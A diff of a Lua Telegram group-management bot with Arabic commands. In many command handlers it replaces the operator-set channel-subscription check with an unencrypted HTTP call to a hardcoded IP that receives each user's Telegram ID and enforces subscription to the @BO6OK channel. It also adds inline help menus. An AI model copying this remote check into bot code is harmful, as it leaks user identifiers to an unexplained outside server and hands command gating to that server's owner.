-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
 if data.message_ == "Channel chat title can be changed by administrators only" then
@@ -8840,14 +8511,11 @@ end,nil)
 end
 
 if text == "تاك للكل" and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
 },function(ta,BOYKA)
@@ -8867,14 +8535,11 @@ end,nil)
 end
 
 if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if tonumber(SUDO) == tonumber(result.sender_user_id_) then
@@ -9059,28 +8724,22 @@ return false
 end
 end
 if text == 'اضف رد للكل' and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 send(msg.chat_id_, msg.id_,' ❃∫ ارسل الكلمه تريد اضافتها')
 database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
 return false 
 end
 if text == 'حذف رد للكل' and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 send(msg.chat_id_, msg.id_,' ❃∫ ارسل الكلمه تريد حذفها')
 database:set(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_,true)
@@ -9257,28 +8916,22 @@ return false
 end
 end
 if text == 'اضف رد' and Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 send(msg.chat_id_, msg.id_,' ❃∫ ارسل الكلمه التي تريد اضافتها')
 database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
 return false 
 end
 if text == 'حذف رد' and Manager(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 send(msg.chat_id_, msg.id_,' ❃∫ ارسل الكلمه التي تريد حذفها')
 database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true2')
@@ -9532,14 +9185,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 end
 if text and text:match("^ايدي @(.*)$") then
 local username = text:match("^ايدي @(.*)$")
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 function start_function(extra, result, success)
 if result.id_ then
@@ -9887,14 +9537,11 @@ database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
 send(msg.chat_id_, msg.id_,'❃∫ تم تغير الايدي ارسل ايدي لرؤيته')
 end
 if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
 database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
@@ -9966,12 +9613,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, amir.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n ❃∫ ايديك ~⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ~⪼ '..username..'\n ❃∫ رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ~⪼ '..rtpa..'\n ❃∫ تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ~⪼ '..Msguser..'\n ❃∫ نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ~⪼ '..edit..'\n ❃∫ نقاطك ~⪼ '..NUMPGAME..'\n')
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, amir.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n ❃∫ ايديك ⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ⪼ '..username..'\n ❃∫ رتبتك ⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ⪼ '..rtpa..'\n ❃∫ تفاعلك ⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ⪼ '..Msguser..'\n ❃∫ نسبه تفاعلك ⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ⪼ '..edit..'\n ❃∫ نقاطك ⪼ '..NUMPGAME..'\n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n ❃∫ ايديك ~⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ~⪼ '..username..'\n ❃∫ رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ~⪼ '..rtpa..'\n ❃∫ تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ~⪼ '..Msguser..'\n ❃∫ نسبه  تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ~⪼ '..edit..'\n ❃∫ نقاطك ~⪼ '..NUMPGAME..']\n')
+send(msg.chat_id_, msg.id_,'[\n ❃∫ ايديك ⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ⪼ '..username..'\n ❃∫ رتبتك ⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ⪼ '..rtpa..'\n ❃∫ تفاعلك ⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ⪼ '..Msguser..'\n ❃∫ نسبه  تفاعلك ⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ⪼ '..edit..'\n ❃∫ نقاطك ⪼ '..NUMPGAME..']\n')
 else
-send(msg.chat_id_, msg.id_, '\n ❃∫ الصوره ~⪼ ليس لديك صور في حسابك'..'[\n ❃∫ ايديك ~⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ~⪼ '..username..'\n ❃∫ رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ~⪼ '..rtpa..'\n ❃∫ تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ~⪼ '..Msguser..'\n ❃∫ نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ~⪼ '..edit..'\n ❃∫ نقاطك ~⪼ '..NUMPGAME..']\n')
+send(msg.chat_id_, msg.id_, '\n ❃∫ الصوره ⪼ ليس لديك صور في حسابك'..'[\n ❃∫ ايديك ⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ⪼ '..username..'\n ❃∫ رتبتك ⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ⪼ '..rtpa..'\n ❃∫ تفاعلك ⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ⪼ '..Msguser..'\n ❃∫ نسبه تفاعلك ⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ⪼ '..edit..'\n ❃∫ نقاطك ⪼ '..NUMPGAME..']\n')
 end 
 end
 end
@@ -9989,7 +9636,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n ❃∫ ايديك ~⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ~⪼ '..username..'\n ❃∫ رتبتك ~⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ~⪼ '..rtpa..'\n ❃∫ تفاعلك ~⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ~⪼ '..Msguser..'\n ❃∫ نسبه تفاعلك ~⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ~⪼ '..edit..'\n ❃∫ نقاطك ~⪼ '..NUMPGAME..']\n')
+send(msg.chat_id_, msg.id_,'[\n ❃∫ ايديك ⪼ '..msg.sender_user_id_..'\n ❃∫ معرفك ⪼ '..username..'\n ❃∫ رتبتك ⪼ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ❃∫ موقعك ⪼ '..rtpa..'\n ❃∫ تفاعلك ⪼ '..Total_Msg(Msguser)..'\n ❃∫ رسائلك ⪼ '..Msguser..'\n ❃∫ نسبه تفاعلك ⪼ '..string.sub(nspatfa, 1,5)..' %\n ❃∫ السحكات ⪼ '..edit..'\n ❃∫ نقاطك ⪼ '..NUMPGAME..']\n')
 end
 end
 
@@ -10018,14 +9665,11 @@ send(msg.chat_id_, msg.id_,' ❃∫ تم مسح جهاتك'  )
 database:del(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_)
 end
 if text == 'جهاتي' or text == 'شكد ضفت' then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 local Num = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
 if Num == 0 then 
@@ -10036,14 +9680,11 @@ end
 send(msg.chat_id_, msg.id_,Text) 
 end
 if text == "تنظيف المشتركين" and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,'- لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 local pv = database:smembers(bot_id.."User_Bot")
 local sendok = 0
@@ -10072,14 +9713,11 @@ end
 return false
 end
 if text == "تنظيف الكروبات" and DevBOYKAW(msg) then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,'- لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n- اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 local group = database:smembers(bot_id..'Chek:Groups') 
 local w = 0
@@ -10205,14 +9843,11 @@ tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(ms
 return false
 end
 if text == 'نقاط' or text == 'نقاطي' then 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
 if Num == 0 then 
@@ -10224,14 +9859,11 @@ send(msg.chat_id_, msg.id_,Text)
 end
 if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") then
 local NUMPY = text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") 
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
+local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
 if tonumber(NUMPY) == tonumber(0) then
 send(msg.chat_id_,msg.id_,"\n* ❃∫ لا استطيع البيع اقل من 1 *") 
@@ -10484,41 +10116,57 @@ send(msg.chat_id_, msg.id_, ' ❃∫ الان يمكنك ارسال الكليش
 database:set(bot_id..'help10'..msg.sender_user_id_,'true')
 return false 
 end
-
+-----------------------------------------------
 if text == 'الاوامر' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,' ❃∫ هاذا الامر خاص بالادمنيه\n ❃∫ ارسل {م10} لعرض اوامر الاعضاء')
-return false
+  if not Mod(msg) then
+  send(msg.chat_id_, msg.id_,'❃∫ هاذا الامر خاص بالادمنيه\n ❃∫ ارسل {م10} لعرض اوامر الاعضاء')
+  return false
+  end
+  local url,res = http.request('http://209.250.249.209/ch/?id='..msg.sender_user_id_)
+data = JSON.decode(url)
+if data.Ch_Member.Info_BO6OK ~= true then
+send(msg.chat_id_,msg.id_,'\n❃∫عليك الاشتراك في قناة البوت \n❃∫قناة البوت ← { @BO6OK }')   
+return false 
 end
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ❃∫ لا تستطيع استخدام البوت \n  ❃∫ يرجى الاشتراك بالقناه اولا \n  ❃∫ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-local help_text = database:get(bot_id..'help_text')
-Text = [[
-*❃اهلا انتツفي اوامر البوت❃*
-ٴ≪━━━━━━𝘽𝙆━━━━━━≫ٴ
-*❃م1 ◂ اوامر الحمايه*
-*❃م2 ◂ اوامر تعطيل ~ تفعيل*
-*❃م3 ◂ اوامر ضع ~ اضف*
-*❃م4 ◂ اوامر مسح ~ حذف*
-*❃م5 ◂ اوامر تنزيل+رفع+التغير*
-*❃م6 ◂ اوامر الكروب*
-*❃م7 ◂ اوامر التحشيش*
-*❃م8 ◂ اوامر مطور البوت*
-*❃م9 ◂ اوامر مطور الاساسي* 
-*❃م10 ◂ اوامر الاعضاء*
-ٴ≪━━━━━━𝘽𝙆━━━━━━≫ٴ
-彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢ 
-]]
-send(msg.chat_id_, msg.id_,(help_text or Text)) 
-return false
-end
+  local Text =[[
+    *❃اهلا انتツفي اوامر البوت❃*
+    ٴ≪━━━━━━𝘽𝙆━━━━━━≫ٴ
+    *❃م1 ◂ اوامر الحمايه*
+    *❃م2 ◂ اوامر تعطيل ~ تفعيل*
+    *❃م3 ◂ اوامر ضع ~ اضف*
+    *❃م4 ◂ اوامر مسح ~ حذف*
+    *❃م5 ◂ اوامر تنزيل+رفع+التغير*
+    *❃م6 ◂ اوامر الكروب*
+    *❃م7 ◂ اوامر التحشيش*
+    *❃م8 ◂ اوامر مطور البوت*
+    *❃م9 ◂ اوامر مطور الاساسي* 
+    *❃م10 ◂ اوامر الاعضاء*
+    ٴ≪━━━━━━𝘽𝙆━━━━━━≫ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢ 
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  local msg_id = msg.id_/2097152/0.5
+  https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+  return false
+  end
+  ----------------------------------------
 if text == "تعطيل الزخرفه" and Manager(msg) then
 send(msg.chat_id_, msg.id_, '❃∫ تم تعطيل الزخرفه')
 database:set(bot_id.." amir:zhrf_Bots"..msg.chat_id_,"close")
@@ -10676,6 +10324,701 @@ function tdcli_update_callback(data)  -- clback
 if data.ID == "UpdateChannel" then 
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
 database:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
+end
+end
+if data.ID == "UpdateNewCallbackQuery" then
+  local Chat_id = data.chat_id_
+  local Msg_id = data.message_id_
+  local msg_idd = Msg_id/2097152/0.5
+  local Text = data.payload_.data_
+  if Text == '/help1' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ اوامر الحمايه اتبع مايلي ...
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ قفل + فتح ← الامر… 
+    ⌯︙ ← { بالتقيد ، بالطرد ، بالكتم }
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ الروابط
+    ⌯︙ المعرف
+    ⌯︙ التاك
+    ⌯︙ الشارحه
+    ⌯︙ التعديل
+    ⌯︙ التثبيت
+    ⌯︙ المتحركه
+    ⌯︙ الملفات
+    ⌯︙ الصور
+    ⌯︙ التفليش
+    ⌯︙ الاباحي
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ الماركداون
+    ⌯︙ البوتات
+    ⌯︙ التكرار
+    ⌯︙ الكلايش
+    ⌯︙ السيلفي
+    ⌯︙ الملصقات
+    ⌯︙ الفيديو
+    ⌯︙ الانلاين
+    ⌯︙ الدردشه
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ التوجيه
+    ⌯︙ الاغاني
+    ⌯︙ الصوت
+    ⌯︙ الجهات
+    ⌯︙ الاشعارات
+    •━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help2' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ اهلا بك عزيزي …
+    ⌯︙ اوامر تفعيل وتعطيل …
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ تفعيل ~ تعطيل + امر …
+     •━━━━━━━━━━━━━•ٴ
+    ⌯︙ اطردني
+    ⌯︙ صيح
+    ⌯︙ ضافني
+    ⌯︙ الرابط 
+    ⌯︙ الحظر
+    ⌯︙ الرفع
+    ⌯︙ الحظر
+    ⌯︙ الرفع 
+    ⌯︙ الايدي
+    ⌯︙ الالعاب
+    ⌯︙ ردود المطور
+    ⌯︙ الترحيب
+    ⌯︙ ردود المدير
+    ⌯︙ الردود
+    ⌯︙ ردود البوت
+    ⌯︙ اوامر التحشيش
+    ⌯︙ صورتي
+    ⌯︙ زخرفه
+    ⌯︙ حساب العمر
+    ⌯︙ الابراج
+    ⌯︙ تنبيه الاسماء
+    ⌯︙ تنبيه المعرف
+    ⌯︙ تنبيه الصور
+    ⌯︙ التوحيد
+    ⌯︙ الكتم الاسم
+    ⌯︙ نسبه الرجوله 
+    ⌯︙ نسبه الانوثه 
+    ⌯︙ نسبه الكره
+    ⌯︙ نسبه الحب
+    ⌯︙ ءall
+     •━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help3' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ اهلا بك عزيزي …
+    ⌯︙ اوامر الوضع ~ اضف …
